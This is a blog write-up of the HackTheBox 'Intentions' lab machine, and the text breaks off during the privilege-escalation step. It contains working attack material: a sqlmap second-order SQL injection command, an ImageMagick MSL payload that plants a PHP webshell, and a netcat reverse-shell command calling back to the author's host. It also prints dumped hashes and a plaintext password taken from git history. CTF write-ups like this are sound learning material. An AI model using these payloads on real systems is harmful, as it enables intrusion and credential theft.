---
layout: post
title: Intentions - Hard - Linux
date: 01-07-2023
categories: [CTF - HackTheBox]
tag: [API, SQL Injection, Second Order Attack, Imagek, Binary Exploitation]
---

A very challenging machine. It was difficult to enumerate the API endpoints because it only returned a valid status code when the absolute path was given. Two versions of the API were running. It was possible to register a new user and get a token for authenication to access other endpoints. SQL injection was used to dump the database using a second order attack. The SQL injection stage of the box was rewarding to solve. The passwords in the database were hashed using bcrypt so not really possible to crack them. The second version of the API actually accepted a hash to authenticate users which allowed admin access. 

The admin panel was using Imagek on its backend. In the past Imagek has been simple to exploit. This time the exploit was new and very interesting. After lots of trial and error a reverse php shell was uploaded to a public web directory and used to gain a foothold. The users password was found in a commit history of a repo.

Escalating to root required exploiting a custom binary on the machine which had the capability to read the contents of any file on the system. However the contents were then hashed as MD5. The trick to solve it was to MD5 the contents of the root flag 1-4 characters at a time and brute force it with hashcat using masks, prefixing the known bytes as it progressed. Overall a very interesting machine.

# Nmap results
```xml
# Nmap 7.93 scan initiated Sat Jul  1 20:02:28 2023 as: nmap -sC -sV -p- -oA nmap/intentions-allports -v 10.129.159.23
Nmap scan report for 10.129.159.23
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 47d20066275ee69c808903b58f9e60e5 (ECDSA)
|_  256 c8d0ac8d299b87405f1bb0a41d538ff1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Intentions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  1 20:02:56 2023 -- 1 IP address (1 host up) scanned in 27.96 seconds
```
# Port 80 - HTTP
![5ff41c39d024f59ec1b530c0eed432fa.png](/assets/img/5ff41c39d024f59ec1b530c0eed432fa.png)

# Register reveals API endpoint
```
POST /api/v1/auth/register HTTP/1.1
Host: 10.129.170.72
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.170.72/
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6InpDMlFzSXpFQ2ljdnV5RHBQNTIwaEE9PSIsInZhbHVlIjoiUUwvWExrUDE2cVdlbEdteWtZY0Yzbkt1dUdSRG5JeFdvcll1WEZDMXRkUW9GZTN0WTZkTXpNMFg3ZlJ0UERGS1ZyNU55S0t3bUpmRXV5VkRRVDB1bG1tWmc0NXJYNUF4aE9zdmtDa2ZWTnNIRTYvZVM1MlZRdE1SL0VaaUFKM0oiLCJtYWMiOiJiMTM2OGU4MDA0ODYzZjk1NWNlNmMwNTllMzY0NGU4OTYzZGM3NzJhYjM5NDEyYjBhOTIwYzIzMzIyYTA3MTIyIiwidGFnIjoiIn0=
Content-Length: 96
Origin: http://10.129.170.72
DNT: 1
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6InpDMlFzSXpFQ2ljdnV5RHBQNTIwaEE9PSIsInZhbHVlIjoiUUwvWExrUDE2cVdlbEdteWtZY0Yzbkt1dUdSRG5JeFdvcll1WEZDMXRkUW9GZTN0WTZkTXpNMFg3ZlJ0UERGS1ZyNU55S0t3bUpmRXV5VkRRVDB1bG1tWmc0NXJYNUF4aE9zdmtDa2ZWTnNIRTYvZVM1MlZRdE1SL0VaaUFKM0oiLCJtYWMiOiJiMTM2OGU4MDA0ODYzZjk1NWNlNmMwNTllMzY0NGU4OTYzZGM3NzJhYjM5NDEyYjBhOTIwYzIzMzIyYTA3MTIyIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IjVBN1BCYzVGRDkxVXpldU5kaDhRWXc9PSIsInZhbHVlIjoicHAyZG5qTDdSVFpOZzNES202WkZxZXM1cWxDT1dJeEZEb3AxdGNCa3l6NTY2RDVndEM4RXZXOGx6Njd4bm1rZXRaa2xyenUyQjl3ajVVT0d4TEFOY1VnaldObkRQalY3dnoxajhIeGRuMS9xbWMvWWQwc203MFNZL0RIRitPYnIiLCJtYWMiOiIyM2FiZWJjZDY1ODdjNWJkY2FhYzU1MmQ3ODBmYTVhNDExMTg3MjgwOGE4NGFiNzY0ODVmMTgwZjc4OTIwYzNhIiwidGFnIjoiIn0%3D

{"email":"test@test.com","password":"password","name":"test","password_confirmation":"password"}
```
# API Login Request
```
POST /api/v1/auth/login HTTP/1.1
Host: 10.129.170.72
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.170.72/
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6InpDMlFzSXpFQ2ljdnV5RHBQNTIwaEE9PSIsInZhbHVlIjoiUUwvWExrUDE2cVdlbEdteWtZY0Yzbkt1dUdSRG5JeFdvcll1WEZDMXRkUW9GZTN0WTZkTXpNMFg3ZlJ0UERGS1ZyNU55S0t3bUpmRXV5VkRRVDB1bG1tWmc0NXJYNUF4aE9zdmtDa2ZWTnNIRTYvZVM1MlZRdE1SL0VaaUFKM0oiLCJtYWMiOiJiMTM2OGU4MDA0ODYzZjk1NWNlNmMwNTllMzY0NGU4OTYzZGM3NzJhYjM5NDEyYjBhOTIwYzIzMzIyYTA3MTIyIiwidGFnIjoiIn0=
Content-Length: 47
Origin: http://10.129.170.72
DNT: 1
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6InpDMlFzSXpFQ2ljdnV5RHBQNTIwaEE9PSIsInZhbHVlIjoiUUwvWExrUDE2cVdlbEdteWtZY0Yzbkt1dUdSRG5JeFdvcll1WEZDMXRkUW9GZTN0WTZkTXpNMFg3ZlJ0UERGS1ZyNU55S0t3bUpmRXV5VkRRVDB1bG1tWmc0NXJYNUF4aE9zdmtDa2ZWTnNIRTYvZVM1MlZRdE1SL0VaaUFKM0oiLCJtYWMiOiJiMTM2OGU4MDA0ODYzZjk1NWNlNmMwNTllMzY0NGU4OTYzZGM3NzJhYjM5NDEyYjBhOTIwYzIzMzIyYTA3MTIyIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IjVBN1BCYzVGRDkxVXpldU5kaDhRWXc9PSIsInZhbHVlIjoicHAyZG5qTDdSVFpOZzNES202WkZxZXM1cWxDT1dJeEZEb3AxdGNCa3l6NTY2RDVndEM4RXZXOGx6Njd4bm1rZXRaa2xyenUyQjl3ajVVT0d4TEFOY1VnaldObkRQalY3dnoxajhIeGRuMS9xbWMvWWQwc203MFNZL0RIRitPYnIiLCJtYWMiOiIyM2FiZWJjZDY1ODdjNWJkY2FhYzU1MmQ3ODBmYTVhNDExMTg3MjgwOGE4NGFiNzY0ODVmMTgwZjc4OTIwYzNhIiwidGFnIjoiIn0%3D

{"email":"test@test.com","password":"password"}
```
# SQL Injection

The genres field appears to be injectable. Second order injection is required as the data is pulled from the user feed endpoint. The injection point is located on the genres endpoint. The below requests were used to solve the problem.

# SQL Injection - First request
```
POST /api/v1/gallery/user/genres HTTP/1.1
Host: 10.129.157.82
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.157.82/gallery
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6InBYUngxR20yengyandXelU2SS8rOHc9PSIsInZhbHVlIjoiRjA5NVdoV0YyMVVkdThkbjJTbVJ5NGMyYklHYTMxQmx4S25HY0NCQ3ZiUk1RY3BuNDA4WW85MDduZkM0ZjdxemlSblFsSkZ2cjdjKzRsN0hFd3FLQ0hlZGVBbVBlQTJJUzdmWGhrSFNzVk1naFdTYnhpc1ZkSzZ3NHk2d3NjMkgiLCJtYWMiOiI2ZGU1OGY0NDA1NGEyYzE2ZWUyYTBmODg5YTUzMDM0MTg0MzNkMzNmNDM5NWUzOWM3Y2FkZDE4ODQ1M2JjNWQxIiwidGFnIjoiIn0=
Content-Length: 22
Origin: http://10.129.157.82
DNT: 1
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6InBYUngxR20yengyandXelU2SS8rOHc9PSIsInZhbHVlIjoiRjA5NVdoV0YyMVVkdThkbjJTbVJ5NGMyYklHYTMxQmx4S25HY0NCQ3ZiUk1RY3BuNDA4WW85MDduZkM0ZjdxemlSblFsSkZ2cjdjKzRsN0hFd3FLQ0hlZGVBbVBlQTJJUzdmWGhrSFNzVk1naFdTYnhpc1ZkSzZ3NHk2d3NjMkgiLCJtYWMiOiI2ZGU1OGY0NDA1NGEyYzE2ZWUyYTBmODg5YTUzMDM0MTg0MzNkMzNmNDM5NWUzOWM3Y2FkZDE4ODQ1M2JjNWQxIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkJoWHJXblY2c0hZMldmZkNnb2J3QkE9PSIsInZhbHVlIjoiMzA3aU5nc2swS2dSMmwzT3dibVROMm5IRFRUck5xaUg5U2FyZHJMSTdDb3R1M1FjWXlBMG9qaEI2eFJOY2cyWXU5SGo3dzFiL3dLZzEvNnVGeFovT0FrRTdlanVldjZMd3NmUjUrQmRHRDdkWE9FT1hZRCs5aHlHdVZMWmt3cE4iLCJtYWMiOiI0MmUwOGQyY2VhNjZjMDg3ZDY5MzZiMTM0MzhjYzU1MTJhNDc2MzAwNmQ3ODZhYjdmNmE5ZGYzODI1MWNlY2VhIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1Ny44Mi9hcGkvdjEvYXV0aC9sb2dpbiIsImlhdCI6MTY4ODMzNTgyOSwiZXhwIjoxNjg4MzU3NDI5LCJuYmYiOjE2ODgzMzU4MjksImp0aSI6IjVaWTRhYmJzTHJpeFl4cGciLCJzdWIiOiIzMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.VxW7rkDBjacovDeykLxJNrsOKPXnWFwrbsrgh7p5aPo

{"genres":"*"
}
```
# SQL Injection - Second request
```
GET /api/v1/gallery/user/feed HTTP/1.1
Host: 10.129.157.82
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.157.82/gallery
X-Requested-With: XMLHttpRequest
X-XSRF-TOKEN: eyJpdiI6InBYUngxR20yengyandXelU2SS8rOHc9PSIsInZhbHVlIjoiRjA5NVdoV0YyMVVkdThkbjJTbVJ5NGMyYklHYTMxQmx4S25HY0NCQ3ZiUk1RY3BuNDA4WW85MDduZkM0ZjdxemlSblFsSkZ2cjdjKzRsN0hFd3FLQ0hlZGVBbVBlQTJJUzdmWGhrSFNzVk1naFdTYnhpc1ZkSzZ3NHk2d3NjMkgiLCJtYWMiOiI2ZGU1OGY0NDA1NGEyYzE2ZWUyYTBmODg5YTUzMDM0MTg0MzNkMzNmNDM5NWUzOWM3Y2FkZDE4ODQ1M2JjNWQxIiwidGFnIjoiIn0=
DNT: 1
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6InBYUngxR20yengyandXelU2SS8rOHc9PSIsInZhbHVlIjoiRjA5NVdoV0YyMVVkdThkbjJTbVJ5NGMyYklHYTMxQmx4S25HY0NCQ3ZiUk1RY3BuNDA4WW85MDduZkM0ZjdxemlSblFsSkZ2cjdjKzRsN0hFd3FLQ0hlZGVBbVBlQTJJUzdmWGhrSFNzVk1naFdTYnhpc1ZkSzZ3NHk2d3NjMkgiLCJtYWMiOiI2ZGU1OGY0NDA1NGEyYzE2ZWUyYTBmODg5YTUzMDM0MTg0MzNkMzNmNDM5NWUzOWM3Y2FkZDE4ODQ1M2JjNWQxIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkJoWHJXblY2c0hZMldmZkNnb2J3QkE9PSIsInZhbHVlIjoiMzA3aU5nc2swS2dSMmwzT3dibVROMm5IRFRUck5xaUg5U2FyZHJMSTdDb3R1M1FjWXlBMG9qaEI2eFJOY2cyWXU5SGo3dzFiL3dLZzEvNnVGeFovT0FrRTdlanVldjZMd3NmUjUrQmRHRDdkWE9FT1hZRCs5aHlHdVZMWmt3cE4iLCJtYWMiOiI0MmUwOGQyY2VhNjZjMDg3ZDY5MzZiMTM0MzhjYzU1MTJhNDc2MzAwNmQ3ODZhYjdmNmE5ZGYzODI1MWNlY2VhIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1Ny44Mi9hcGkvdjEvYXV0aC9sb2dpbiIsImlhdCI6MTY4ODMzNTgyOSwiZXhwIjoxNjg4MzU3NDI5LCJuYmYiOjE2ODgzMzU4MjksImp0aSI6IjVaWTRhYmJzTHJpeFl4cGciLCJzdWIiOiIzMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.VxW7rkDBjacovDeykLxJNrsOKPXnWFwrbsrgh7p5aPo
```
# SQL Injection - Final

The injection would only work with a prefix and suffix as shown below. The web application was also stripping spaces so space2comment was used to fix that.

`sqlmap -r 1.req --prefix="food') " --suffix="#" --second-req 2.req --batch --dbms=mysql --level 5 --risk 3 --tamper=space2comment.py --dbs`
# SQL Injection - Results

Database dumped and the only useful information was the below hashes of administrator accounts. The hashes themselves could not be cracked easily as bcrypt. 
```
id,name,admin,email,genres,password,created_at,updated_at
1,steve,1,steve@intentions.htb,"food,travel,nature",$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa,2023-02-02 17:43:00,2023-02-02 17:43:00
2,greg,1,greg@intentions.htb,"food,travel,nature",$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m,2023-02-02 17:44:11,2023-02-02 17:44:11
3,Melisa Runolfsson,0,hettie.rutherford@example.org,"food,travel,nature",$2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6,2023-02-02 18:02:37,2023-02-02 18:02:37
```
# Hidden API - v2 login accepts hashes

Cracking the hashes was not reasonable for a CTF challenge. I discovered a v2 version of the API which has a login endpoint which is requesting a hash. This allowed authentication as administrator to the web app.

##### Request
```
POST /api/v2/auth/login HTTP/1.1
Host: 10.129.170.72
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.170.72/
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6InpDMlFzSXpFQ2ljdnV5RHBQNTIwaEE9PSIsInZhbHVlIjoiUUwvWExrUDE2cVdlbEdteWtZY0Yzbkt1dUdSRG5JeFdvcll1WEZDMXRkUW9GZTN0WTZkTXpNMFg3ZlJ0UERGS1ZyNU55S0t3bUpmRXV5VkRRVDB1bG1tWmc0NXJYNUF4aE9zdmtDa2ZWTnNIRTYvZVM1MlZRdE1SL0VaaUFKM0oiLCJtYWMiOiJiMTM2OGU4MDA0ODYzZjk1NWNlNmMwNTllMzY0NGU4OTYzZGM3NzJhYjM5NDEyYjBhOTIwYzIzMzIyYTA3MTIyIiwidGFnIjoiIn0=
Content-Length: 101
Origin: http://10.129.170.72
DNT: 1
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6InpDMlFzSXpFQ2ljdnV5RHBQNTIwaEE9PSIsInZhbHVlIjoiUUwvWExrUDE2cVdlbEdteWtZY0Yzbkt1dUdSRG5JeFdvcll1WEZDMXRkUW9GZTN0WTZkTXpNMFg3ZlJ0UERGS1ZyNU55S0t3bUpmRXV5VkRRVDB1bG1tWmc0NXJYNUF4aE9zdmtDa2ZWTnNIRTYvZVM1MlZRdE1SL0VaaUFKM0oiLCJtYWMiOiJiMTM2OGU4MDA0ODYzZjk1NWNlNmMwNTllMzY0NGU4OTYzZGM3NzJhYjM5NDEyYjBhOTIwYzIzMzIyYTA3MTIyIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IjVBN1BCYzVGRDkxVXpldU5kaDhRWXc9PSIsInZhbHVlIjoicHAyZG5qTDdSVFpOZzNES202WkZxZXM1cWxDT1dJeEZEb3AxdGNCa3l6NTY2RDVndEM4RXZXOGx6Njd4bm1rZXRaa2xyenUyQjl3ajVVT0d4TEFOY1VnaldObkRQalY3dnoxajhIeGRuMS9xbWMvWWQwc203MFNZL0RIRitPYnIiLCJtYWMiOiIyM2FiZWJjZDY1ODdjNWJkY2FhYzU1MmQ3ODBmYTVhNDExMTg3MjgwOGE4NGFiNzY0ODVmMTgwZjc4OTIwYzNhIiwidGFnIjoiIn0%3D

{"email":"greg@intentions.htb","hash":"$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m"}
```

##### Response
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: application/json
Connection: close
Cache-Control: no-cache, private
Date: Mon, 03 Jul 2023 19:56:12 GMT
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE3MC43Mi9hcGkvdjIvYXV0aC9sb2dpbiIsImlhdCI6MTY4ODQxNDE3MiwiZXhwIjoxNjg4NDM1NzcyLCJuYmYiOjE2ODg0MTQxNzIsImp0aSI6InpGWm53cUk5cVE5TDBySEgiLCJzdWIiOiIyIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.eiQigx7jrSfMX3CWHKRbq93mEN3M8dSVNs4aQTZCKCU
X-RateLimit-Limit: 3600
X-RateLimit-Remaining: 3597
Access-Control-Allow-Origin: *
Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE3MC43Mi9hcGkvdjIvYXV0aC9sb2dpbiIsImlhdCI6MTY4ODQxNDE3MiwiZXhwIjoxNjg4NDM1NzcyLCJuYmYiOjE2ODg0MTQxNzIsImp0aSI6InpGWm53cUk5cVE5TDBySEgiLCJzdWIiOiIyIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.eiQigx7jrSfMX3CWHKRbq93mEN3M8dSVNs4aQTZCKCU; expires=Tue, 04-Jul-2023 01:56:12 GMT; Max-Age=21600; path=/; httponly; samesite=lax
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Length: 34

{"status":"success","name":"greg"}
```
# Accessing /admin

Used browser storage to change the token to the one granted above. Logged in as user greg who is an administrator. Now able to access /admin

![1d93da12b18034a47174106e264c8227.png](/assets/img/1d93da12b18034a47174106e264c8227.png)

![be3ecfeba84871364435133918176277.png](/assets/img/be3ecfeba84871364435133918176277.png)

# RCE - Imagek

Resource used: https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/

Using the material in the above article it was possible to get a reverse shell. Some adjustments needed to be made as shown below.

#### Payload
```
POST /api/v2/admin/image/modify?effect=none&path=vid:msl:/tmp/php* HTTP/1.1
Host: 10.129.157.82
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.157.82/admin
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=ABC;
X-XSRF-TOKEN: eyJpdiI6IjNLRElDME9SZTRWNGMySktsaUp1N0E9PSIsInZhbHVlIjoid1JNNEsyR3U1QW8rNkpqN1JabkVpc1hQVmJGVDY1cGxtUG1zMUZDdVV5SFRJUGhKak5mSGxYZlJHbHlNUmZLcmo1YnlIZjEyYUFZSlR2K2V5a3BIMEl2TndaRWZQL0VJdWJtUml0YmxaUXZVTGI1YSt3TlZvUGw0NW9ObWtEK3ciLCJtYWMiOiI4NzFmYWJjZjZkYzU4MGQxMmUwOTQ4MTI4N2E0MDg5N2M3YWE3NDc1NmRhMzgzZGRlYTI1ZjU5MTYxYmNmZTgxIiwidGFnIjoiIn0=
Content-Length: 285
Connection: close
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE1Ny44Mi9hcGkvdjIvYXV0aC9sb2dpbiIsImlhdCI6MTY4ODM0NTc1NSwiZXhwIjoxNjg4MzY3MzU1LCJuYmYiOjE2ODgzNDU3NTUsImp0aSI6IkttT1F5Y1N5WlM5VkxRT2IiLCJzdWIiOiIyIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.Ve86AQz0muqKzK1WOLnoy0F0ZzsiVPjsZwb0t6HO2kc; XSRF-TOKEN=eyJpdiI6IjNLRElDME9SZTRWNGMySktsaUp1N0E9PSIsInZhbHVlIjoid1JNNEsyR3U1QW8rNkpqN1JabkVpc1hQVmJGVDY1cGxtUG1zMUZDdVV5SFRJUGhKak5mSGxYZlJHbHlNUmZLcmo1YnlIZjEyYUFZSlR2K2V5a3BIMEl2TndaRWZQL0VJdWJtUml0YmxaUXZVTGI1YSt3TlZvUGw0NW9ObWtEK3ciLCJtYWMiOiI4NzFmYWJjZjZkYzU4MGQxMmUwOTQ4MTI4N2E0MDg5N2M3YWE3NDc1NmRhMzgzZGRlYTI1ZjU5MTYxYmNmZTgxIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IjJoeDlYb3M2d3AzY0pVU2Z0Rzd0UGc9PSIsInZhbHVlIjoic1Y4Qk1NeVhuRXJ0dFU3ck9DelF4UEhhODhHbzlnVENiUUUxMHM1eXgrMlRUTHRnVUh5Y3pVMkNxWTVXdFkyNHR3Uk9ZSzFyL3djQ2x0M1ZJcWt4N3JHNzUyaW4vTCtGUHBEVVQ5bmc3bko5SFdBUGMyMkhYYlpyK2tWd1V4Q0oiLCJtYWMiOiJiZjliZGQwNGVmMWQxZTZlMjA4YWJhOGI2MzcyZDhkOTAxMTdhZTEzNWY5NDBhN2I5NmMyNTY4MWI2YTA3MTlkIiwidGFnIjoiIn0%3D


--ABC
Content-Disposition: form-data; name="swarm"; filename="swarm.msl"
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php system($_REQUEST['a']); ?&gt;" />
 <write filename="info:/var/www/html/intentions/storage/app/public/swarm.php" />
</image>
--ABC--
```

### Reverse Shell - www-data
```
GET /storage/swarm.php?a=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.104+9001+>/tmp/f HTTP/1.1

Host: 10.129.170.72

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

DNT: 1

Connection: close

Cookie: XSRF-TOKEN=eyJpdiI6IlA0STl2MkxxRWlJenNYcmhwRTBLR2c9PSIsInZhbHVlIjoibWMraC92NmFCaVRNSWN0Ly9kNmUxL3hLMDVsUzhlbWtLWGhWVjNyYlZRdm1EUDVLakoxTURodWZNa1FqNkpocE93ZHI4YnA4UlZYTzVQYVE0czlqYmpJd1BJeGk2RFc0UjBZMk9CR1UrdXJRMnR6UzJPdVh6bUtKWGd2WlpGbmQiLCJtYWMiOiJkZWI5YjMyODg4YmFhN2RhYjc3NjIzMTk4NDk4MGNiMGM1MzU4ZGM5NGU4ZjEzM2VmNGYyNDUzODU4Yjc3MTE0IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6Ii9zRkxUSnl3am10dk5ZZFdNR0Q0NWc9PSIsInZhbHVlIjoiT2FHV3VKMTY5VWIwcjRsTzk3TlduSnhvdENZSzNPZHg2RkZPS2xKSFQyRVNIVTFiZGtpWVQzbUdtOVpTZUx3aE5CK1Bvc3I4NW92eTFFMytTdmZsalpuWktvZkhjR3JIWDFJMjA5clBZTGRNVlJZVE9mWERNenlBeHNYUVRaWHYiLCJtYWMiOiI4NmQwMTZjZTMzY2U3YTQzMWU5NjA2ZDIxZTAzOWMxMWNlNTY3OWNlYmVlOTQ3OGMyNDljNjQwYzkxMjllYzExIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTI5LjE3MC43Mi9hcGkvdjIvYXV0aC9sb2dpbiIsImlhdCI6MTY4ODQxNDE3MiwiZXhwIjoxNjg4NDM1NzcyLCJuYmYiOjE2ODg0MTQxNzIsImp0aSI6InpGWm53cUk5cVE5TDBySEgiLCJzdWIiOiIyIiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.eiQigx7jrSfMX3CWHKRbq93mEN3M8dSVNs4aQTZCKCU

Upgrade-Insecure-Requests: 1
```

```
┌─[parrot@parrotos]─[~/htb/intentions]
└──╼ $nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.104] from (UNKNOWN) [10.129.170.72] 34090
/bin/sh: 0: can't access tty; job control turned off
$ 
```
# Finding gregs password
Gregs password was found in the history of a hidden .git directory.

```
diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
new file mode 100644
index 0000000..f57e37b
--- /dev/null
+++ b/tests/Feature/Helper.php
@@ -0,0 +1,19 @@
+<?php
+
+namespace Tests\Feature;
+use Tests\TestCase;
+use App\Models\User;
+use Auth;
+class Helper extends TestCase
+{
+    public static function getToken($test, $admin = false) {
+        if($admin) {
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
+        } 
+        else {
+            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
+            return $res->headers->get('Authorization');
+        }
+    }
+}
```
# SSH as user greg

Credentials found in the .git directory worked when logging in as greg via SSH. User flag captured.

```
greg@intentions:~$ ls -la
total 52
drwxr-x--- 4 greg greg  4096 Jun 19 13:09 .
drwxr-xr-x 5 root root  4096 Jun 10 14:56 ..
lrwxrwxrwx 1 root root     9 Jun 19 13:09 .bash_history -> /dev/null
-rw-r--r-- 1 greg greg   220 Feb  2 18:10 .bash_logout
-rw-r--r-- 1 greg greg  3771 Feb  2 18:10 .bashrc
drwx------ 2 greg greg  4096 Jun 10 15:18 .cache
drwxrwxr-x 3 greg greg  4096 Jun 10 15:26 .local
-rw-r--r-- 1 greg greg   807 Feb  2 18:10 .profile
-rw-r--r-- 1 greg greg    39 Jun 14 10:18 .vimrc
-rwxr-x--- 1 root greg    75 Jun 10 17:33 dmca_check.sh
-rwxr----- 1 root greg 11044 Jun 10 15:31 dmca_hashes.test
-rw-r----- 1 root greg    33 Jul  3 19:38 user.txt
greg@intentions:~$ 
```
# Group permissions - greg
Greg is part of a group called scanner. This is unique and it lead to other interesting file discoveries.

```
greg@intentions:~$ groups
greg scanner
greg@intentions:~$ find / -group scanner 2>/dev/null
/opt/scanner
/opt/scanner/scanner
greg@intentions:~$ 
```
# Inspecting scanner binary

The scanner binary has the capability to read the contents of any file on the system. It also has the ability to read 1 byte at a time and MD5 the result. It should be possible to read the root flag 1-4 bytes at a time and bruteforce the hash as it progresses. Prefixing the known bytes to assist with narrowing down the results.

```
greg@intentions:/opt/scanner$ file scanner
scanner: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=a7sTitVjvr1qc4Ngg3jt/LY6QPsAiDYUOHaK7gUXN/5aWVPmSwER6KHrDxGzr4/SUP48whD2UTLJ-Q2kLmf, stripped
greg@intentions:/opt/scanner$ ./scanner
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

	This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
	This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
	File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

	The hash blacklist file should be maintained as a single LABEL:MD5 per line.
	Please avoid using extra colons in the label as that is not currently supported.

	Expected output:
	1. Empty if no matches found
	2. A line for every match, example:
		[+] {LABEL} matches {FILE}

  -c string
    	Path to image file to check. Cannot be combined with -d
  -d string
    	Path to image directory to check. Cannot be combined with -c
  -h string
    	Path to colon separated hash file. Not compatible with -p
  -l int
